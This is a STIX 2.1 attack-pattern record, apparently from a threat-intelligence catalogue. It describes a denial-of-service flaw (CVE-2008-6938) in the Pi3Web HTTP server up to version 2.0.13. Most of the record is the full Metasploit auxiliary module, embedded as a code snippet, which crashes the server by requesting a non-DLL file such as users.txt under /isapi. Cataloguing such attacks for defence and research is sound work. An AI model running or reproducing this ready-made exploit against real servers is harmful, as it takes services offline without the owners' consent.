{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--de81c806-f83f-4270-813f-0b910165363d",
    "created": "2024-08-14T16:25:32.032393Z",
    "modified": "2024-08-14T16:25:32.032398Z",
    "name": "Pi3Web ISAPI DoS",
    "description": " The Pi3Web HTTP server crashes when a request is made for an invalid DLL file in /isapi for versions 2.0.13 and earlier. By default, the non-DLLs in this directory after installation are users.txt, install.daf and readme.daf. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/http/pi3web_isapi.rb",
            "external_id": "pi3web_isapi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-6938"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Pi3Web ISAPI DoS',\n      'Description'    => %q{\n        The Pi3Web HTTP server crashes when a request is made for an invalid DLL\n        file in /isapi for versions 2.0.13 and earlier. By default, the non-DLLs\n        in this directory after installation are users.txt, install.daf and\n        readme.daf.\n      },\n      'Author'         => 'kris katterjohn',\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'CVE', '2008-6938'],\n        [ 'OSVDB', '49998'],\n        [ 'EDB', '7109' ]\n      ],\n      'DisclosureDate' => '2008-11-13'))\n\n    register_options([\n      OptString.new('FILENAME', [ true, 'File in /isapi to request', 'users.txt' ])\n    ])\n  end\n\n  def run\n    begin\n      o = { 'uri' => \"/isapi/#{datastore['FILENAME']}\" }\n\n      c = connect(o)\n      c.send_request(c.request_raw(o))\n\n      print_status(\"Request sent to #{rhost}:#{rport}\")\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_status(\"Couldn't connect to #{rhost}:#{rport}\")\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-11-13"
}